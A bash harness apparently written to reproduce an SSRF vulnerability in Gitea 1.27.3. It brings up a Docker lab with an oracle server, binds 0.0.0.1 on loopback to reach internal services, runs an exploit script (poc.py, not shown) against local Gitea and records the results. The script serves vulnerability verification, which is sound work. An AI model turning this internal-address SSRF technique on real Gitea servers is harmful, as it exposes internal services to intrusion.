#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
export COMPOSE_PROJECT_NAME="${COMPOSE_PROJECT_NAME:-gitea-hostmatcher-0000-ssrf}"
BASE="${1:-http://127.0.0.1:18131}"

chmod +x poc.py oracle/server.py

down() {
  echo "== docker compose down =="
  docker compose down || true
}

wait_gitea() {
  local i code
  echo "== wait for Gitea =="
  for i in $(seq 1 90); do
    code="$(curl -s -o /tmp/gitea-0000-ver -w '%{http_code}' --max-time 5 "${BASE}/api/v1/version" || true)"
    if [[ "${code}" == "200" ]]; then
      echo "IOC gitea-up http=${code}"
      return 0
    fi
    echo "IOC wait-gitea i=${i} http=${code}"
    sleep 3
  done
  return 1
}

wait_oracle() {
  local i body
  echo "== wait for oracle on 0.0.0.1:8080 =="
  for i in $(seq 1 40); do
    body="$(docker compose exec -T gitea wget -q -O - --timeout=3 http://0.0.0.1:8080/ssrf 2>/dev/null || true)"
    if [[ "${body}" == *"GITEA-0000-SSRF"* ]]; then
      echo "IOC oracle-up via 0.0.0.1"
      return 0
    fi
    echo "IOC wait-oracle i=${i} snippet=${body:0:80}"
    sleep 2
  done
  return 1
}

echo "== docker compose up (gitea/gitea:1.27.3 + same-netns oracle, loopback :18131) =="
up_ok=0
for attempt in $(seq 1 15); do
  if docker compose up -d --build; then
    up_ok=1
    break
  fi
  echo "IOC compose-up-retry attempt=${attempt}"
  sleep 20
done
if [[ "${up_ok}" != 1 ]]; then
  echo "FAIL docker compose up" | tee poc-last-run.txt
  docker compose logs --tail=80 || true
  down
  exit 1
fi

if ! wait_gitea; then
  echo "FAIL Gitea did not become ready on ${BASE}" | tee poc-last-run.txt
  docker compose logs --tail=80 gitea || true
  down
  exit 1
fi

echo "== bind 0.0.0.1 on lo (shared netns) =="
docker compose exec -T -u root gitea sh -c 'ip addr add 0.0.0.1/8 dev lo 2>/dev/null || true' || true

if ! wait_oracle; then
  echo "FAIL oracle not reachable at http://0.0.0.1:8080/ssrf" | tee poc-last-run.txt
  docker compose logs --tail=80 oracle || true
  docker compose logs --tail=40 gitea || true
  down
  exit 1
fi

echo "== poc.py =="
set +e
python3 ./poc.py "${BASE}" | tee poc-last-run.txt
rc=${PIPESTATUS[0]}
set -e
if [[ "${rc}" != 0 ]]; then
  echo "== oracle logs (tail) ==" | tee -a poc-last-run.txt
  docker compose logs --tail=80 oracle | tee -a poc-last-run.txt || true
  echo "== gitea logs (tail) ==" | tee -a poc-last-run.txt
  docker compose logs --tail=80 gitea | tee -a poc-last-run.txt || true
fi
down
exit "${rc}"
